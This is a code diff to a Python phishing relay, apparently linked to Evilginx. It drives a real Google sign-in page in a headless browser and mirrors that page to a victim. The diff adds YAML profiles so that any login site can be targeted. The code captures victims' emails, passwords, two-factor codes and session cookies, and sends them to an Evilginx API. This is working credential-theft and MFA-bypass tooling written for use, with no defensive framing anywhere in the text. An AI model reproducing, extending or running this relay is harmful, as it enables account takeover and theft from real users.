@@ -58,6 +58,78 @@ RES_LOCK = threading.Lock()
 ASSET_HOSTS = ("gstatic.com", "googleapis.com", "googleusercontent.com",
                "google.com", "google.vn")
 
+# ------------------------------------------------------------ profiles -----
+# Per-target relay profiles (profiles/<phishlet>.yaml). Everything a target
+# needs is declarative: signin URL, input/button selectors, classification
+# strings, cookie domains, asset hosts, victim-page branding. Adding a relay
+# target = dropping one YAML file here — no code changes.
+PROFILE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "profiles")
+PROFILES = {}
+
+# Fallback when no profile file matches the requested target: the historical
+# Google behaviour, bit-for-bit (flow "google" keeps the dedicated state
+# machine incl. number-match / totpPin / prompt handling).
+GOOGLE_DEFAULT = {
+    "phishlet": "google", "flow": "google",
+    "signin_url": SIGNIN_URL,
+    "done_hosts": ["mail.google.com", "myaccount.google.com"],
+    "cookie_domains": ["google.com"],
+    "asset_hosts": list(ASSET_HOSTS),
+    "reopen_url": "https://mail.google.com",
+    "inputs": {"password": "input[name='Passwd']", "email": "#identifierId",
+               "code": "input[name='totpPin']"},
+    "buttons": {"next": ["#identifierNext button", "#passwordNext button",
+                         "#totpNext button", "button:has-text('Next')"]},
+    "classify": {
+        "challenge": ["enter a code", "nhập mã", "mã xác minh", "verify it",
+                      "2-step", "xác minh 2 bước"],
+        "bad_account": ["couldn't find", "couldn’t find", "không tìm thấy"],
+        "wrong_password": ["wrong password", "mật khẩu không chính xác"],
+        "botguard": ["not be secure", "không an toàn"]},
+    "page": {"title": "Sign in - Google Accounts", "button_label": "Next",
+             "accent": "#0b57d0", "text": "#202124", "muted": "#5f6368",
+             "line": "#dadce0", "card_radius": 24,
+             "footer_left": "English (United States)",
+             "footer_right": "Help   Privacy   Terms"},
+}
+
+
+def load_profiles():
+    """Load every profiles/*.yaml; merge with sane defaults. The union of all
+    asset hosts feeds the global rewrite whitelist (profiles are static, so
+    this stays thread-safe after startup)."""
+    import glob
+    try:
+        import yaml
+    except ImportError:
+        print("[profiles] PyYAML missing — only the built-in google profile "
+              "is available", flush=True)
+        PROFILES["google"] = dict(GOOGLE_DEFAULT)
+        return
+    for f in sorted(glob.glob(os.path.join(PROFILE_DIR, "*.yaml"))):
+        try:
+            d = yaml.safe_load(open(f, encoding="utf-8")) or {}
+        except Exception as e:
+            print(f"[profile] {os.path.basename(f)}: {e}", flush=True)
+            continue
+        name = str(d.get("phishlet") or os.path.basename(f)[:-5]).lower()
+        merged = dict(GOOGLE_DEFAULT)
+        merged.update(d)
+        merged["phishlet"] = name
+        PROFILES[name] = merged
+    if "google" not in PROFILES:
+        PROFILES["google"] = dict(GOOGLE_DEFAULT)
+    hosts = set(ASSET_HOSTS)
+    for p in PROFILES.values():
+        hosts.update(p.get("asset_hosts") or [])
+    globals()["ASSET_HOSTS"] = tuple(hosts)
+    print(f"[profiles] loaded: {', '.join(sorted(PROFILES))}", flush=True)
+
+
+def get_profile(target):
+    t = str(target or "google").strip().lower()
+    return PROFILES.get(t)
+
 os.makedirs(STORE_DIR, exist_ok=True)
 
 
@@ -307,10 +379,40 @@ def fetch_asset(pg, url, budget):
 # --------------------------------------------------------------- session ---
 class RelaySession(threading.Thread):
 
-    def __init__(self, sid, email=None, locale=None, vw=None, vh=None):
+    def __init__(self, sid, email=None, locale=None, vw=None, vh=None,
+                 profile=None):
         super().__init__(daemon=True)
         self.id = sid
         self.email = email
+        self.profile = profile or dict(GOOGLE_DEFAULT)
+        # signin URL may carry an {hl} locale placeholder (Google-style)
+        hl = "vi" if (locale or "").startswith("vi") else "en"
+        self.signin_url = str(self.profile.get("signin_url") or SIGNIN_URL)
+        if "{hl}" in self.signin_url:
+            self.signin_url = self.signin_url.format(hl=hl)
+        # selector tables from the profile (password first — mirrors the
+        # historical INPUT_SELS precedence)
+        ins = self.profile.get("inputs") or {}
+        self.input_sels = []
+        for kind in ("password", "email", "code"):
+            sel = ins.get(kind)
+            if sel:
+                self.input_sels.append((sel, kind))
+        btns = (self.profile.get("buttons") or {}).get("next") or []
+        if isinstance(btns, str):
+            btns = [btns]
+        self.next_buttons = list(btns)
+        self.done_hosts = set(self.profile.get("done_hosts") or
+                              ["mail.google.com", "myaccount.google.com"])
+        self.cookie_domains = self.profile.get("cookie_domains") or ["google.com"]
+        cl = self.profile.get("classify") or {}
+        self.classify_map = {k: [s.lower() for s in (v or [])]
+                             for k, v in cl.items()}
+        self.page_brand = dict(self.profile.get("page") or {})
+        # victim-side done redirect falls back to the profile's reopen_url
+        self.page_brand.setdefault("done_url",
+                                   self.profile.get("reopen_url")
+                                   or "https://mail.google.com")
         self.locale = locale or "en-US"      # mirror the victim's UI language
         # mirror the victim's viewport so Google serves the SAME layout
         # variant (one-column with logo vs two-column) the victim expects
@@ -362,7 +464,7 @@ class RelaySession(threading.Thread):
             inline = pg.evaluate(
                 "() => [...document.querySelectorAll('style')].map(s => s.textContent)")
             for txt in inline or []:
-                css, urls = rewrite_css_urls(txt, SIGNIN_URL.format(hl="en"))
+                css, urls = rewrite_css_urls(txt, self.signin_url)
                 for u in urls:
                     fetch_asset(pg, u, budget)
                 styles.append(css)
@@ -402,6 +504,7 @@ class RelaySession(threading.Thread):
                   ("#identifierId", "email"),
                   ("input[name='totpPin']", "code"),
                   ("input[type='tel']", "code")]
+    # per-session selector table from the relay profile (same shape)
 
     CARD_JS = """() => {
       const main = document.querySelector('#initialView') || document.querySelector('main');
@@ -433,7 +536,8 @@ class RelaySession(threading.Thread):
                         "width": box["w"], "height": box["h"]}
         except Exception:
             pass
-        for sel in ("#initialView", "div[role='main']", "main"):
+        card_sels = self.profile.get("card_selectors") or             ("#initialView", "div[role='main']", "main")
+        for sel in card_sels:
             try:
                 loc = pg.locator(sel).first
                 if loc.is_visible():
@@ -454,7 +558,7 @@ class RelaySession(threading.Thread):
                 return
             ibox = None
             kind = self.input_kind
-            for sel, k in self.INPUT_SELS:
+            for sel, k in (self.input_sels or self.INPUT_SELS):
                 loc = pg.locator(sel).first
                 try:
                     if loc.is_visible():
@@ -541,8 +645,9 @@ class RelaySession(threading.Thread):
                     "h": round(100 * ibox["height"] / cbox["height"], 2)}
                 # the real button (wrapper divs inflate the box ~52px; the
                 # inner button is Google's ~40px pill)
-                for bsel in ("#identifierNext button", "#passwordNext button",
-                             "#totpNext button", "button:has-text('Next')"):
+                for bsel in (self.next_buttons or
+                             ("#identifierNext button", "#passwordNext button",
+                              "#totpNext button", "button:has-text('Next')")):
                     bloc = pg.locator(bsel).first
                     try:
                         if bloc.is_visible():
@@ -614,22 +719,41 @@ class RelaySession(threading.Thread):
     def _classify(self, pg):
         host = (urlparse(pg.url).hostname or "").lower()
         body = self._body(pg)
-        if host in ("mail.google.com", "myaccount.google.com"):
-            return "done"
-        if self._visible(pg, "input[name='Passwd']") or self._visible(pg, "input[type='password']"):
-            return "password"
+        if host in self.done_hosts:
+            # same-host login/2FA pages must not count as done: require that
+            # NO profile input is visible (cloudflare lesson: signin_url and
+            # done host share dash.cloudflare.com)
+            if not any(self._visible(pg, sel) for sel, _ in
+                       (self.input_sels or self.INPUT_SELS)):
+                return "done"
+        # password visibility wins first (password page implies email done)
+        for sel, k in (self.input_sels or self.INPUT_SELS):
+            if k == "password" and self._visible(pg, sel):
+                return "password"
         low = body.lower()
-        if self._visible(pg, "input[name='totpPin']") or "enter a code" in low \
-                or "nhập mã" in low or "mã xác minh" in low \
-                or "verify it" in low or "2-step" in low or "xác minh 2 bước" in low:
+        cm = self.classify_map
+        if any(self._visible(pg, sel) for sel, k in
+               (self.input_sels or self.INPUT_SELS) if k == "code") \
+                or any(s in low for s in cm.get("challenge", [])):
             return "challenge"
-        if ("couldn" in low and "find" in low) or "không tìm thấy" in low:
+        if any(s in low for s in cm.get("bad_account", [])):
             return "error_bad_account"
-        if "wrong password" in low or "mật khẩu không chính xác" in low:
+        if any(s in low for s in cm.get("wrong_password", [])):
             return "password_retry"
-        if "not be secure" in low or "không an toàn" in low:
+        if any(s in low for s in cm.get("botguard", [])):
             return "error_botguard"
         return None
+
+    def _visible_input_kind(self, pg, skip_filled=True):
+        """First visible profile input kind not yet filled in the sidecar —
+        drives the generic flow (handles both single-page forms like the
+        Cloudflare card and step-by-step wizards like Google's)."""
+        for sel, k in (self.input_sels or self.INPUT_SELS):
+            if skip_filled and k in getattr(self, "_filled", ()):
+                continue
+            if self._visible(pg, sel):
+                return k, sel
+        return None, None
 
     def _wait_input(self, pg, kind, hint):
         """Wait for the victim's input while keeping the mirror streaming."""
@@ -652,10 +776,12 @@ class RelaySession(threading.Thread):
 
     def _collect(self, pg):
         out = []
+        doms = [d.lstrip(".") for d in self.cookie_domains]
         try:
             for c in pg.context.cookies():
                 dom = c.get("domain", "")
-                if "google.com" in dom:
+                bare = dom.lstrip(".")
+                if any(bare == d or bare.endswith("." + d) for d in doms):
                     out.append({"name": c["name"], "value": c["value"],
                                 "domain": dom, "path": c.get("path", "/"),
                                 "expires": c.get("expires", -1)})
@@ -700,7 +826,7 @@ class RelaySession(threading.Thread):
             ctx.load_cert_chain(os.path.expanduser("~/.evilginx/api/client.crt"),
                                 os.path.expanduser("~/.evilginx/api/client.key"))
             body = json.dumps({
-                "phishlet": "google",
+                "phishlet": self.profile.get("phishlet", "google"),
                 "session_id": f"relay-{rec['id']}",
                 "username": rec.get("email") or "",
                 "password": rec.get("password") or "",
@@ -736,121 +862,10 @@ class RelaySession(threading.Thread):
             pg = browser.new_page(user_agent=UA, locale=self.locale,
                                   viewport={"width": self.vw, "height": self.vh},
                                   device_scale_factor=2)  # 2x raster, sharp on HiDPI victims
-            pg.goto(SIGNIN_URL.format(hl="vi" if self.locale.startswith("vi") else "en"),
-                    wait_until="load", timeout=60000)
-            pg.wait_for_selector("#identifierId", timeout=20000)
-            pg.wait_for_selector("#identifierNext", state="visible", timeout=20000)
-            time.sleep(2)  # let the v3 app finish booting so the click registers
-            self._prefetch_assets(pg)
-            if not self.email:
-                # mirror-first: the victim interacts with the REAL mirrored
-                # identifier card — no fake UI anywhere
-                item = self._wait_input(pg, "email", "Nhập email của bạn")
-                if item[0] == "abort":
-                    self._finish(pg, "error", "Hết thời gian phiên")
-                    browser.close()
-                    return
-                self.email = item[1]
-            pg.fill("#identifierId", self.email)
-            time.sleep(0.5)
-            pg.click("#identifierNext")
-
-            # ---- identifier -> password / challenge / error -------------
-            st = None
-            for i in range(45):
-                time.sleep(1)
-                self._stream(pg)
-                st = self._classify(pg)
-                if st:
-                    break
-            if st in (None, "error_bad_account", "error_botguard"):
-                self._finish(pg, "error",
-                             "Không tìm thấy tài khoản Google này." if st == "error_bad_account"
-                             else "Google tạm thời từ chối — thử lại sau.")
-                browser.close()
-                return
-            retries = 0
-            while time.time() < self.deadline:
-                if st in ("password", "password_retry"):
-                    item = self._wait_input(pg, "password",
-                                            "Nhập mật khẩu của tài khoản " + str(self.email))
-                    if item[0] == "abort":
-                        break
-                    if self.password is None:
-                        self.password = item[1]
-                    try:
-                        pg.fill("input[name='Passwd']", item[1], timeout=5000)
-                    except Exception:
-                        try:
-                            pg.fill("input[type='password']", item[1], timeout=4000)
-                        except Exception:
-                            st = self._classify(pg) or "wait"
-                            continue
-                    try:
-                        pg.click("#passwordNext", timeout=5000)
-                    except Exception:
-                        # victim may have navigated the card (Forgot password,
-                        # Try another way) — follow the real flow instead of dying
-                        st = self._classify(pg) or "wait"
-                        continue
-                    time.sleep(5)
-                    st = self._classify(pg) or "wait"
-                    for _ in range(12):
-                        if st in ("password", "challenge", "done", "password_retry"):
-                            break
-                        time.sleep(1)
-                        self._stream(pg)
-                        st = self._classify(pg) or st
-                    if st == "password_retry":
-                        retries += 1
-                        if retries >= 3:
-                            self._finish(pg, "error", "Quá nhiều lần sai mật khẩu.")
-                            break
-                elif st == "challenge":
-                    body = self._body(pg)
-                    low = body.lower()
-                    if self._visible(pg, "input[name='totpPin']") \
-                            or "enter a code" in low or "nhập mã" in low:
-                        item = self._wait_input(pg, "code", "Nhập mã xác minh")
-                        if item[0] == "abort":
-                            break
-                        sel = "input[name='totpPin']" if self._visible(pg, "input[name='totpPin']") \
-                            else "input[type='tel'], input[name='code']"
-                        pg.fill(sel, item[1])
-                        pg.click("#totpNext, button:has-text('Next')")
-                        time.sleep(5)
-                    else:
-                        # Google prompt / number match — stream until approved
-                        self.state = "challenge"
-                        self.hint = "Phê duyệt trên điện thoại (nhập số hiển thị vào app)"
-                        self.need_input = None
-                        for _ in range(150):
-                            time.sleep(1.2)
-                            self._stream(pg)
-                            st2 = self._classify(pg)
-                            if st2 in ("done", "challenge", "password"):
-                                st = st2
-                                break
-                        else:
-                            st = None
-                        continue
-                    st = self._classify(pg) or "wait"
-                    for _ in range(12):
-                        if st in ("password", "challenge", "done", "password_retry"):
-                            break
-                        time.sleep(1)
-                        self._stream(pg)
-                        st = self._classify(pg) or st
-                elif st == "done":
-                    self._finish(pg, "done", "Đăng nhập thành công")
-                    break
-                else:
-                    time.sleep(1.2)
-                    self._stream(pg)
-                    st = self._classify(pg) or st
+            if self.profile.get("flow") == "generic":
+                self._run_generic(pg, browser)
             else:
-                self._finish(pg, "error", "Hết thời gian phiên")
-            browser.close()
+                self._run_google(pg, browser)
         except Exception as e:
             self.state = "error"
             self.error = str(e)[:200]
@@ -863,6 +878,202 @@ class RelaySession(threading.Thread):
                     pw.stop()
                 except Exception:
                     pass
+
+    def _run_generic(self, pg, browser):
+        """Profile-driven flow for any target: walk the visible profile inputs
+        in order (email → password → code), fill + click next, classify
+        between steps. Handles single-card forms (email+password on one page:
+        email is filled without submitting) and step wizards alike."""
+        self._filled = set()
+        retries = 0
+        pg.goto(self.signin_url, wait_until="load", timeout=60000)
+        time.sleep(2)
+        self._prefetch_assets(pg)
+        hints = {"email": "Nhập email của bạn",
+                 "password": "Nhập mật khẩu" + (f" của {self.email}" if self.email else ""),
+                 "code": "Nhập mã xác minh"}
+        while time.time() < self.deadline:
+            self._stream(pg)
+            cls = self._classify(pg)
+            if cls == "done":
+                self._finish(pg, "done", "Đăng nhập thành công")
+                browser.close()
+                return
+            if cls == "error_bad_account":
+                self._finish(pg, "error", "Không tìm thấy tài khoản này.")
+                browser.close()
+                return
+            if cls == "error_botguard":
+                self._finish(pg, "error", "Trang tạm thời từ chối — thử lại sau.")
+                browser.close()
+                return
+            if cls == "password_retry":
+                retries += 1
+                if retries >= 3:
+                    self._finish(pg, "error", "Quá nhiều lần sai mật khẩu.")
+                    browser.close()
+                    return
+            kind, sel = self._visible_input_kind(pg)
+            if not kind:
+                time.sleep(1.2)
+                continue
+            if kind == "email" and self.email:
+                # email already known — still must be typed into the real form
+                value = self.email
+            else:
+                item = self._wait_input(pg, kind, hints.get(kind, kind))
+                if item[0] == "abort":
+                    self._finish(pg, "error", "Hết thời gian phiên")
+                    browser.close()
+                    return
+                value = item[1]
+                if kind == "email" and not self.email:
+                    self.email = value
+                elif kind == "password" and self.password is None:
+                    self.password = value
+            try:
+                pg.fill(sel, value, timeout=5000)
+            except Exception as e:
+                print(f"[fill] {self.id} {kind}: {str(e)[:80]}", flush=True)
+                time.sleep(1)
+                continue
+            self._filled.add(kind)
+            # submit after the LAST visible field: if another unfilled input
+            # is already on the card (single-page form), move to it first
+            nk, _ = self._visible_input_kind(pg)
+            submit_now = not nk
+            if submit_now:
+                for bsel in self.next_buttons:
+                    if self._visible(pg, bsel):
+                        try:
+                            pg.click(bsel, timeout=5000)
+                        except Exception:
+                            continue
+                        break
+                self._filled = set()  # next card starts fresh (code step etc.)
+                time.sleep(4)
+            else:
+                time.sleep(0.6)
+        self._finish(pg, "error", "Hết thời gian phiên")
+        browser.close()
+
+    def _run_google(self, pg, browser):
+        # the historical Google state machine, kept bit-for-bit
+        pg.goto(SIGNIN_URL.format(hl="vi" if self.locale.startswith("vi") else "en"),
+            wait_until="load", timeout=60000)
+        pg.wait_for_selector("#identifierId", timeout=20000)
+        pg.wait_for_selector("#identifierNext", state="visible", timeout=20000)
+        time.sleep(2)  # let the v3 app finish booting so the click registers
+        self._prefetch_assets(pg)
+        if not self.email:
+            # mirror-first: the victim interacts with the REAL mirrored
+            # identifier card — no fake UI anywhere
+            item = self._wait_input(pg, "email", "Nhập email của bạn")
+            if item[0] == "abort":
+                self._finish(pg, "error", "Hết thời gian phiên")
+                browser.close()
+                return
+            self.email = item[1]
+        pg.fill("#identifierId", self.email)
+        time.sleep(0.5)
+        pg.click("#identifierNext")
+
+        # ---- identifier -> password / challenge / error -------------
+        st = None
+        for i in range(45):
+            time.sleep(1)
+            self._stream(pg)
+            st = self._classify(pg)
+            if st:
+                break
+        if st in (None, "error_bad_account", "error_botguard"):
+            self._finish(pg, "error",
+                         "Không tìm thấy tài khoản Google này." if st == "error_bad_account"
+                         else "Google tạm thời từ chối — thử lại sau.")
+            browser.close()
+            return
+        retries = 0
+        while time.time() < self.deadline:
+            if st in ("password", "password_retry"):
+                item = self._wait_input(pg, "password",
+                                        "Nhập mật khẩu của tài khoản " + str(self.email))
+                if item[0] == "abort":
+                    break
+                if self.password is None:
+                    self.password = item[1]
+                try:
+                    pg.fill("input[name='Passwd']", item[1], timeout=5000)
+                except Exception:
+                    try:
+                        pg.fill("input[type='password']", item[1], timeout=4000)
+                    except Exception:
+                        st = self._classify(pg) or "wait"
+                        continue
+                try:
+                    pg.click("#passwordNext", timeout=5000)
+                except Exception:
+                    # victim may have navigated the card (Forgot password,
+                    # Try another way) — follow the real flow instead of dying
+                    st = self._classify(pg) or "wait"
+                    continue
+                time.sleep(5)
+                st = self._classify(pg) or "wait"
+                for _ in range(12):
+                    if st in ("password", "challenge", "done", "password_retry"):
+                        break
+                    time.sleep(1)
+                    self._stream(pg)
+                    st = self._classify(pg) or st
+                if st == "password_retry":
+                    retries += 1
+                    if retries >= 3:
+                        self._finish(pg, "error", "Quá nhiều lần sai mật khẩu.")
+                        break
+            elif st == "challenge":
+                body = self._body(pg)
+                low = body.lower()
+                if self._visible(pg, "input[name='totpPin']") \
+                        or "enter a code" in low or "nhập mã" in low:
+                    item = self._wait_input(pg, "code", "Nhập mã xác minh")
+                    if item[0] == "abort":
+                        break
+                    sel = "input[name='totpPin']" if self._visible(pg, "input[name='totpPin']") \
+                        else "input[type='tel'], input[name='code']"
+                    pg.fill(sel, item[1])
+                    pg.click("#totpNext, button:has-text('Next')")
+                    time.sleep(5)
+                else:
+                    # Google prompt / number match — stream until approved
+                    self.state = "challenge"
+                    self.hint = "Phê duyệt trên điện thoại (nhập số hiển thị vào app)"
+                    self.need_input = None
+                    for _ in range(150):
+                        time.sleep(1.2)
+                        self._stream(pg)
+                        st2 = self._classify(pg)
+                        if st2 in ("done", "challenge", "password"):
+                            st = st2
+                            break
+                    else:
+                        st = None
+                    continue
+                st = self._classify(pg) or "wait"
+                for _ in range(12):
+                    if st in ("password", "challenge", "done", "password_retry"):
+                        break
+                    time.sleep(1)
+                    self._stream(pg)
+                    st = self._classify(pg) or st
+            elif st == "done":
+                self._finish(pg, "done", "Đăng nhập thành công")
+                break
+            else:
+                time.sleep(1.2)
+                self._stream(pg)
+                st = self._classify(pg) or st
+        else:
+            self._finish(pg, "error", "Hết thời gian phiên")
+        browser.close()
 
 
 SESSIONS = {}
@@ -878,7 +1089,8 @@ def public_state(s, client_hash=None):
             "card_w": s.card_w,
             "input_box": s.input_box, "button_box": s.button_box,
             "input_kind": s.input_kind, "label": s.label,
-            "top_line": s.top_line}
+            "top_line": s.top_line,
+            "page": s.page_brand or {}}
 
 
 # ------------------------------------------------------------------ page ---
@@ -981,6 +1193,12 @@ class Handler(BaseHTTPRequestHandler):
         except Exception:
             return self._json({"error": "bad json"}, 400)
         if path == "/api/start":
+            target = str(data.get("target") or "google").strip().lower()[:40]
+            profile = get_profile(target)
+            if not profile:
+                return self._json(
+                    {"error": f"unknown relay target '{target}' "
+                              f"(no profiles/{target}.yaml)"}, 400)
             email = (data.get("email") or "").strip()[:120]
             if email and not re.match(r"[^@\s]+@[^@\s]+\.[^@\s]+", email):
                 return self._json({"error": "bad email"}, 400)
@@ -993,11 +1211,13 @@ class Handler(BaseHTTPRequestHandler):
             except (TypeError, ValueError):
                 vw = vh = None
             sid = secrets.token_hex(8)
-            s = RelaySession(sid, email, locale=locale, vw=vw, vh=vh)
+            s = RelaySession(sid, email, locale=locale, vw=vw, vh=vh,
+                            profile=profile)
             with LOCK:
                 SESSIONS[sid] = s
             s.start()
-            print(f"[session] {sid} start email={email}", flush=True)
+            print(f"[session] {sid} target={profile.get('phishlet')} "
+                  f"email={email}", flush=True)
             return self._json({"id": sid})
         if path == "/api/input":
             s = SESSIONS.get((data.get("id") or "")[:40])
@@ -1038,6 +1258,7 @@ if __name__ == "__main__":
         sys.exit(1)
     print(f"[bgrelay] port={RELAY_PORT} store={STORE_DIR}", flush=True)
     print(f"[bgrelay] OP_KEY={OP_KEY}", flush=True)
+    load_profiles()
     threading.Thread(target=start_bridge, daemon=True).start()
     threading.Thread(target=reaper, daemon=True).start()
     ensure_xvfb()
